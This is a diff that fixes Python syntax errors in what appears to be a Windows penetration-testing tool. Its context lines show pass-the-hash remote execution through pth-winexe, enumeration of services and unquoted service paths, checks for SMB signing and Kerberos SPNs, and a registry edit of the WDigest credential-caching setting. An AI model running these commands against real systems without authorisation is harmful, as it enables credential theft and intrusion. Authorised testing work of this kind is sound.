@@ -1135,7 +1135,7 @@ def datadump(user, passw, host, path, os_version):
 				#Cycle through list
 				for i in xrange(len(unquoted)):
 					#Print unquoted services.
-					print(unquoted[i].strip()[:len(unquoted[i].strip())-40]))
+					print(unquoted[i].strip()[:len(unquoted[i].strip())-40])
 					thefile.write(unquoted[i].strip())
 
 				#Close file handle
@@ -1143,11 +1143,11 @@ def datadump(user, passw, host, path, os_version):
 
 				#Check file exists and then print message to screen
 				if os.path.isfile(outputpath+targets[0]+'/unquotesservicepaths.txt'):
-					print(colored("[+]Unquoted Service Paths saved to "+outputpath+targets[0]+'/unquotesservicepaths.txt'+"\n",'yellow')
+					print(colored("[+]Unquoted Service Paths saved to "+outputpath+targets[0]+'/unquotesservicepaths.txt'+"\n",'yellow'))
 
 			#We'll get a list of Windows Services and their paths
 			#wmic service get name,startname,PathName
-			weakservicepermissions=[]
+			weakservicepermissions = []
 			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get name,pathname,startmode \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			services = proc.communicate()[0]
 			for service in services.splitlines():
@@ -1893,7 +1893,7 @@ def run():
 			elif dialect == SMB2_DIALECT_21:
 				print("[+]SMBv2.1 dialect used")
 			else:
-				print("[+]SMBv3.0 dialect used"_
+				print("[+]SMBv3.0 dialect used")
 
 			#Check for SMB Signing
 			#print(smbClient.isSigningRequired())
@@ -3281,7 +3281,7 @@ if windows_updates != 'n':
 
 		print(colored("[+]Good time to grab a Coffee, \n",'green'))
 		print(colored("	   {",'red'))
-		print(colored("        {   }",'red')_
+		print(colored("        {   }",'red'))
 		print(colored("       }_{ __{",'red'))
 		print(colored("    .-{   }   }-.",'red'))
 		print(colored("   (   }     {   )",'red'))
@@ -3773,7 +3773,7 @@ if get_spn in yesanswers or get_spn=="l":
 				print(colored("[-]and run: python setup.py install",'yellow'))
 				exit(1)
 			else:
-				print(colored("[+]Found GetUserSPNs.py installed",'green')
+				print(colored("[+]Found GetUserSPNs.py installed",'green'))
 
 			#Check that pyasn1-0.18 is installed - (seems to be version sensitive)
 			if not os.path.isfile('/usr/local/lib/python2.7/dist-packages/pyasn1-0.1.8-py2.7.egg'):
@@ -4418,7 +4418,7 @@ if edq_wdigest!='n':
 				sys.exit()
 
 			elif edq_wdigest.upper()=='D':
-				print9colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red'))
+				print(colored("\n[+]IMPORTANT - Leave Wdigest in the state that you found it\n\n",'red'))
 
 				print(colored("[+]Disabling Wdigest:",'green'))
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
